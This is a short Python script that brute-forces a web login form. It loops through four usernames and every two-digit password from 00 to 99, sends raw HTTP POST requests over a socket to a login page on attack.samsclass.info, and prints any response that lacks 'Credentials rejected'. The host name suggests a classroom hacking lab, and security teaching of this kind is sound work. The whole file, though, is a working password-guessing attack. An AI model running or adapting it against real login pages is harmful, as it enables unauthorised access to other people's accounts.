import socket
socket.setdefaulttimeout(2)



target = "attack.samsclass.info"
tport = 80
#user = input('Username: ')
#pw = input('Password: ')
responses = {}
for user in ['bill','ted','sally','sue']:
	for pw in range (00, 100):
		
		pw = '%02d' % pw
		length = len(user) + len(pw) +5
		s=socket.socket()
		s.connect((target, tport))
		a = "POST /python/login2.php HTTP/1.1\nHost: " + target \
		+ "\nContent-Length: "+ str(length) \
		+ "\nContent-Type: application/x-www-form-urlencoded" \
		+ "\n\nu=" + user + "&p=" + pw
#		print(a)
		s.send(bytes(a,'UTF-8'))
		x=s.recv(1024)
		y=x.find(b'\r\n\r\n')
		responseBody = x[y:]
		if  responseBody.find(b'Credentials rejected') < 0:
			print(responseBody)
		s.close()
#		if responseBody not in responses:
#			responses[responseBody] = []
#		responses[responseBody].append([user,pw])
#print(responses)
